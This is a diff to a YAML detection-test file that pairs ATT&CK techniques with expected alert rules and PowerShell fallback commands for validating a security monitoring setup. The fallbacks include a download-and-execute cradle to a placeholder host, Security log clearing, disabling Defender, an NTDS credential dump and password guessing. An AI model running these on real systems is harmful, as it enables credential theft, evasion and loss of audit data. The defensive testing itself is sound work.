@@ -16,7 +16,7 @@ tests:
   - atomic_technique: "T1110.001"
     technique_name: "Brute Force - Password Guessing"
     atomic_test_number: 1
-    expected_rules: ["TS-001", "auth_failed_burst"]
+    expected_rules: ["TS-001", "TS-001-lab", "TS-002"]
     sysmon_required: false
     timeout_seconds: 120
     fallback_command: "1..6 | ForEach-Object { net use \\\\127.0.0.1\\IPC$ /user:fakeuser \"WrongPass$_\" 2>$null; Start-Sleep -Milliseconds 500 }"
@@ -25,7 +25,7 @@ tests:
   - atomic_technique: "T1003.001"
     technique_name: "OS Credential Dumping - LSASS Memory"
     atomic_test_number: 1
-    expected_rules: ["TS-060", "lsass_access"]
+    expected_rules: ["TS-060", "TS-061"]
     sysmon_required: true
     timeout_seconds: 120
     notes: "Triggers Sysmon Event 10 targeting lsass.exe. Requires admin."
@@ -33,16 +33,16 @@ tests:
   - atomic_technique: "T1059.001"
     technique_name: "Command and Scripting Interpreter - PowerShell"
     atomic_test_number: 1
-    expected_rules: ["TS-030", "suspicious_powershell", "ps_script_block"]
+    expected_rules: ["TS-030", "TS-030-lab", "TS-082"]
     sysmon_required: false
     timeout_seconds: 120
-    fallback_command: "powershell.exe -Command \"Write-Host 'ART-test'; IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:9999/not-real')\" -ErrorAction SilentlyContinue"
-    notes: "Generates ScriptBlock logging (4104) and suspicious flags. Fallback runs IEX download cradle."
+    fallback_command: "1..5 | ForEach-Object { powershell.exe -Command \"Write-Host 'ART-ScriptBlock-$_'; IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:9999/not-real')\" 2>$null; Start-Sleep -Milliseconds 200 }"
+    notes: "Generates ScriptBlock logging (4104). Runs 5 iterations for threshold. TS-030-lab threshold=2, TS-082 threshold=1 (AMSI bypass pattern)."
 
   - atomic_technique: "T1053.005"
     technique_name: "Scheduled Task/Job - Scheduled Task"
     atomic_test_number: 1
-    expected_rules: ["TS-020", "scheduled_task_creation"]
+    expected_rules: ["TS-020"]
     sysmon_required: false
     timeout_seconds: 120
     fallback_command: "schtasks /create /tn \"TinySocs-ART-Test\" /tr \"cmd /c whoami\" /sc once /st 23:59 /f; Start-Sleep -Seconds 5; schtasks /delete /tn \"TinySocs-ART-Test\" /f"
@@ -51,7 +51,7 @@ tests:
   - atomic_technique: "T1547.001"
     technique_name: "Boot or Logon Autostart Execution - Registry Run Keys"
     atomic_test_number: 1
-    expected_rules: ["TS-091", "registry_run_key"]
+    expected_rules: ["TS-091"]
     sysmon_required: true
     timeout_seconds: 120
     notes: "Modifies Run/RunOnce registry key. Requires Sysmon Event 13."
@@ -59,7 +59,7 @@ tests:
   - atomic_technique: "T1543.003"
     technique_name: "Create or Modify System Process - Windows Service"
     atomic_test_number: 1
-    expected_rules: ["TS-090", "service_install_suspicious"]
+    expected_rules: ["TS-090", "TS-072"]
     sysmon_required: false
     timeout_seconds: 120
     fallback_command: "sc.exe create TinySocsARTtest binPath= \"C:\\Windows\\Temp\\art-test.exe\" start= demand type= own; Start-Sleep -Seconds 5; sc.exe delete TinySocsARTtest"
@@ -68,7 +68,7 @@ tests:
   - atomic_technique: "T1070.001"
     technique_name: "Indicator Removal - Clear Windows Event Logs"
     atomic_test_number: 1
-    expected_rules: ["TS-080", "event_log_cleared"]
+    expected_rules: ["TS-080"]
     sysmon_required: false
     timeout_seconds: 120
     fallback_command: "wevtutil cl Security"
@@ -77,7 +77,7 @@ tests:
   - atomic_technique: "T1562.001"
     technique_name: "Impair Defenses - Disable or Modify Tools"
     atomic_test_number: 1
-    expected_rules: ["TS-081", "defender_tamper"]
+    expected_rules: ["TS-081"]
     sysmon_required: false
     timeout_seconds: 120
     fallback_command: "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue; Start-Sleep -Seconds 5; Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue"
@@ -86,16 +86,16 @@ tests:
   - atomic_technique: "T1021.002"
     technique_name: "Remote Services - SMB/Windows Admin Shares"
     atomic_test_number: 1
-    expected_rules: ["TS-070", "psexec_usage"]
+    expected_rules: ["TS-070", "TS-072"]
     sysmon_required: false
     timeout_seconds: 120
-    fallback_command: "net use \\\\127.0.0.1\\ADMIN$ 2>$null; net use \\\\127.0.0.1\\C$ 2>$null"
-    notes: "Uses PsExec-style service installation. Generates event 7045. Fallback accesses admin shares."
+    fallback_command: "sc.exe create PSEXESVC binPath= \"C:\\Windows\\PSEXESVC.exe\" start= demand type= own 2>$null; Start-Sleep -Seconds 3; sc.exe delete PSEXESVC 2>$null; net use \\\\127.0.0.1\\ADMIN$ 2>$null; net use \\\\127.0.0.1\\C$ 2>$null"
+    notes: "Simulates PsExec by creating PSEXESVC service (generates event 7045). Also accesses admin shares."
 
   - atomic_technique: "T1136.001"
     technique_name: "Create Account - Local Account"
     atomic_test_number: 1
-    expected_rules: ["TS-010", "local_admin_create"]
+    expected_rules: ["TS-010"]
     sysmon_required: false
     timeout_seconds: 120
     fallback_command: "net user TinySocsART P@ssw0rd123! /add 2>$null; Start-Sleep -Seconds 5; net user TinySocsART /delete 2>$null"
@@ -107,13 +107,13 @@ tests:
     expected_rules: ["proc_creation_lolbins", "lolbin_execs"]
     sysmon_required: false
     timeout_seconds: 120
-    fallback_command: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();GetObject(\"script:https://127.0.0.1:9999/not-real\") 2>$null"
-    notes: "Executes rundll32 with suspicious arguments. Detected via 4688 or Sysmon 1."
+    fallback_command: "cmd /c 'rundll32.exe url.dll,OpenURL https://127.0.0.1:9999/not-real' 2>$null; cmd /c 'rundll32.exe advpack.dll,LaunchINFSection %TEMP%\\art-test.inf,,1,' 2>$null"
+    notes: "Executes rundll32 with suspicious arguments. Detected via 4688 or Sysmon 1. Uses cmd /c wrapper to avoid PowerShell parse errors."
 
   - atomic_technique: "T1003.003"
     technique_name: "OS Credential Dumping - NTDS"
     atomic_test_number: 1
-    expected_rules: ["TS-062", "ntds_dit_access"]
+    expected_rules: ["TS-062"]
     sysmon_required: false
     timeout_seconds: 180
     fallback_command: "vssadmin list shadows 2>$null; cmd /c 'ntdsutil \"ac i ntds\" \"ifm\" \"create full %TEMP%\\ntds_art_test\" q q' 2>$null; Remove-Item $env:TEMP\\ntds_art_test -Recurse -Force -ErrorAction SilentlyContinue"
@@ -124,34 +124,34 @@ tests:
   - atomic_technique: "T1087.001"
     technique_name: "Account Discovery - Local Account"
     atomic_test_number: 1
-    expected_rules: ["TS-130", "account_discovery"]
+    expected_rules: ["TS-130"]
     sysmon_required: false
     timeout_seconds: 120
-    fallback_command: "net user; net localgroup administrators; whoami /all; net group 2>$null"
-    notes: "Runs net user/localgroup/whoami. Generates 4688 events. Fallback runs enumeration commands directly."
+    fallback_command: "cmd /c 'net user' 2>$null; cmd /c 'net localgroup administrators' 2>$null; cmd /c 'whoami /all' 2>$null; cmd /c 'net localgroup' 2>$null"
+    notes: "Runs net user/localgroup/whoami. Generates 4688 events (threshold 3). Each cmd /c spawns a process. Removed 'net group' (DC-only)."
 
   - atomic_technique: "T1018"
     technique_name: "Remote System Discovery"
     atomic_test_number: 1
-    expected_rules: ["TS-131", "system_network_discovery"]
+    expected_rules: ["TS-131"]
     sysmon_required: false
     timeout_seconds: 120
-    fallback_command: "ipconfig /all; netstat -an; arp -a; route print; nslookup localhost"
-    notes: "Runs ipconfig/netstat/arp/route. Generates 4688 events. Fallback runs discovery commands directly."
+    fallback_command: "cmd /c 'ipconfig /all' 2>$null; cmd /c 'netstat -an' 2>$null; cmd /c 'arp -a' 2>$null; cmd /c 'route print' 2>$null; cmd /c 'nslookup localhost' 2>$null"
+    notes: "Runs ipconfig/netstat/arp/route/nslookup. Each cmd /c generates a separate 4688 event (threshold 4). Fallback runs discovery commands directly."
 
   - atomic_technique: "T1105"
     technique_name: "Ingress Tool Transfer"
     atomic_test_number: 1
-    expected_rules: ["TS-132", "ingress_tool_transfer", "powershell_web_dl"]
+    expected_rules: ["TS-132"]
     sysmon_required: false
     timeout_seconds: 120
-    fallback_command: "certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt $env:TEMP\\art-test-download.txt 2>$null; Remove-Item $env:TEMP\\art-test-download.txt -ErrorAction SilentlyContinue"
-    notes: "Downloads file via certutil/bitsadmin/PowerShell. Generates 4688/4104. Fallback uses certutil."
+    fallback_command: "Start-Process bitsadmin.exe -ArgumentList '/transfer','artjob','/download','/priority','foreground','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt','$env:TEMP\\art-bitsadmin-test.txt' -Wait -ErrorAction SilentlyContinue; Start-Process certutil.exe -ArgumentList '-urlcache','-split','-f','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt','$env:TEMP\\art-certutil-test.txt' -Wait -ErrorAction SilentlyContinue; Remove-Item $env:TEMP\\art-*-test.txt -ErrorAction SilentlyContinue"
+    notes: "Downloads file via bitsadmin and certutil. Generates 4688 events. Uses Start-Process to ensure process creation events are logged even if access denied."
 
   - atomic_technique: "T1055"
     technique_name: "Process Injection"
     atomic_test_number: 1
-    expected_rules: ["TS-133", "process_injection_sysmon"]
+    expected_rules: ["TS-133"]
     sysmon_required: true
     timeout_seconds: 120
     notes: "CreateRemoteThread injection. Requires Sysmon Event 8."
@@ -159,16 +159,16 @@ tests:
   - atomic_technique: "T1027"
     technique_name: "Obfuscated Files or Information"
     atomic_test_number: 1
-    expected_rules: ["TS-134", "obfuscated_command_line", "scriptblock_base64"]
+    expected_rules: ["TS-134"]
     sysmon_required: false
     timeout_seconds: 120
-    fallback_command: "powershell.exe -enc dwBoAG8AYQBtAGkA -ErrorAction SilentlyContinue; cmd /c \"powershell -e dwBoAG8AYQBtAGkA\" 2>$null"
-    notes: "Encoded/obfuscated PowerShell commands. Generates 4688 and 4104. Fallback runs base64-encoded 'whoami'."
+    fallback_command: "Start-Process powershell.exe -ArgumentList '-enc','dwBoAG8AYQBtAGkA' -Wait -ErrorAction SilentlyContinue; Start-Process cmd.exe -ArgumentList '/c','powershell -e dwBoAG8AYQBtAGkA' -Wait -ErrorAction SilentlyContinue"
+    notes: "Encoded/obfuscated PowerShell commands. Generates 4688 and 4104. Fallback runs base64-encoded 'whoami' via Start-Process to avoid flag conflicts."
 
   - atomic_technique: "T1565.001"
     technique_name: "Data Manipulation - Stored Data Manipulation"
     atomic_test_number: 1
-    expected_rules: ["TS-110", "fim_critical_file_modified"]
+    expected_rules: ["TS-110"]
     sysmon_required: false
     timeout_seconds: 180
     fallback_command: "$hostsFile = 'C:\\Windows\\System32\\drivers\\etc\\hosts'; $backup = Get-Content $hostsFile -Raw; Add-Content $hostsFile '# TinySocs ART test entry'; Start-Sleep -Seconds 5; Set-Content $hostsFile $backup"
